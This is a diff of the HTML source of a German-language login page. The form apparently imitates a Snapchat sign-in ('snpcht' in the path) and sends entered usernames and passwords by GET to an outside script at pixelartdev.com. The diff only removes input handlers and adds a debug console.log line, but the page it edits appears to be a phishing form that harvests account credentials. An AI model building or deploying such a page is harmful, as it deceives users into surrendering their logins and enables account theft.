@@ -43,11 +43,11 @@
 									<form id="login_form" action="http://pixelartdev.com/snpcht/check.php" method="get" class="centered_form ">
 										<div class="form-group has-success">
 											<label for="username" class="control-label">Nutzername oder Email</label>
-											<input type="text" name="username" value="" autocomplete="off" id="username" class="form-control" onchange="doCheck()">
+											<input type="text" name="username" value="" autocomplete="off" id="username" class="form-control" >
 										</div>
 										<div class="form-group has-success">
 											<label for="password" class="control-label">Passwort</label>
-											<input type="password" name="password" value="" autocomplete="off" id="password" class="form-control" onchange="doCheck()">
+											<input type="password" name="password" value="" autocomplete="off" id="password" class="form-control" >
 										</div>
 										<div class="primary_action">
 											<button id="senden" type="submit" class="btn btn-lg btn-primary" disabled="true" >Best&auml;tigen</button>
@@ -418,6 +418,7 @@
 						if(inputs[i].type == "text" || inputs[i].type == "password") {
 							inputs[i].onkeyup = doCheck;
 							inputs[i].onblur = doCheck;
+							console.log(i);
 						}
 					}
 				};
